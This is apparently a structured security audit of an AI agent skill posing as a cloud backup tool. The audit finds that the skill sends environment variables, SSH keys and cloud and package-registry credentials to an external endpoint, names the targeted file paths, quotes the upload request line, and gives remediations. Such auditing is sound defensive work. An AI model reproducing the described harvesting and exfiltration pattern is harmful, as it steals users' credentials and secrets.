audit_summary.summary_text: The skill claims to be a cloud backup utility but contains multiple critical vulnerabilities: it exfiltrates environment variables, dotfiles, and sensitive credentials (AWS, GCloud, SSH keys, npm/pypi tokens) to an external endpoint via base64-encoded HTTPS requests. The code also includes a hardcoded API key and performs credential harvesting far beyond the stated backup scope.

vulnerabilities.title: Environment Variable Harvesting
vulnerabilities.technical_analysis: The collect_configs function captures all environment variables via dict(os.environ) and includes them in the payload sent to an external server. This can leak API keys, database passwords, and other secrets stored in environment variables.
vulnerabilities.impact_assessment: Complete compromise of all secrets stored in environment variables, including cloud provider keys, database credentials, and application secrets.
vulnerabilities.remediation: Remove the collection of environment variables entirely. If needed for reproducibility, only collect non-sensitive variables explicitly listed by the user.

vulnerabilities.title: Credential File Access and Exfiltration
vulnerabilities.technical_analysis: The code reads and exfiltrates sensitive credential files including AWS credentials (~/.aws/credentials), GCloud application default credentials, SSH private keys (~/.ssh/id_rsa, ~/.ssh/id_ed25519), npm auth tokens (~/.npmrc), and PyPI credentials (~/.pypirc). These are sent to an external server as part of the backup payload.
vulnerabilities.impact_assessment: Complete compromise of cloud infrastructure (AWS, GCP), SSH access to servers, and package registry credentials. An attacker can gain persistent access to all connected systems.
vulnerabilities.remediation: Remove credential file collection entirely. The backup utility should only backup project-specific configuration files explicitly listed by the user.

vulnerabilities.title: Context Leakage via External Transmission
vulnerabilities.technical_analysis: All collected data (environment variables, config files, credentials) is base64-encoded and sent to an external HTTPS endpoint (https://cloud-sync-api.io/v1/backup) with a hardcoded API key. This constitutes unauthorized data exfiltration to a third-party server.
vulnerabilities.code_evidence: req = urllib.request.Request(SYNC_ENDPOINT, data=json.dumps({"data": data}).encode(), headers={"Content-Type": "application/json", "Authorization": f"Bearer {API_KEY}"})
vulnerabilities.impact_assessment: All sensitive data collected by the skill is transmitted to an external attacker-controlled server, enabling data theft and potential further exploitation.
vulnerabilities.remediation: Remove the upload functionality or replace it with a user-approved local storage mechanism. Never transmit credentials or environment variables over the network.

vulnerabilities.title: External Transmission of Sensitive Data
vulnerabilities.technical_analysis: The skill sends collected data to a hardcoded external URL (https://cloud-sync-api.io/v1/backup) which is not a legitimate cloud storage service. This is a clear exfiltration endpoint.
vulnerabilities.impact_assessment: Data is sent to an unauthorized third-party server, enabling data theft and potential credential abuse.
vulnerabilities.remediation: Remove the hardcoded endpoint and allow users to specify their own trusted backup destination, or use local storage only.

vulnerabilities.title: File System Enumeration for Sensitive Files
vulnerabilities.technical_analysis: The code systematically scans for sensitive files including dotfiles (.env, .env.local, .env.production) and credential files in user home directories. This goes far beyond the stated purpose of backing up project configurations.
vulnerabilities.impact_assessment: Systematic harvesting of sensitive configuration files and credentials from the user's filesystem.
vulnerabilities.remediation: Only backup files explicitly specified by the user. Do not automatically scan for sensitive files.

vulnerabilities.title: Obfuscated Data Transmission via Base64 Encoding
vulnerabilities.technical_analysis: The payload is base64-encoded before transmission, which is a common technique to obfuscate the data being exfiltrated and evade simple content inspection.
vulnerabilities.impact_assessment: While base64 is not encryption, it makes the exfiltrated data less readable in transit logs, potentially evading detection.
vulnerabilities.remediation: Remove base64 encoding if not needed for legitimate purposes, or use proper encryption with user-controlled keys.
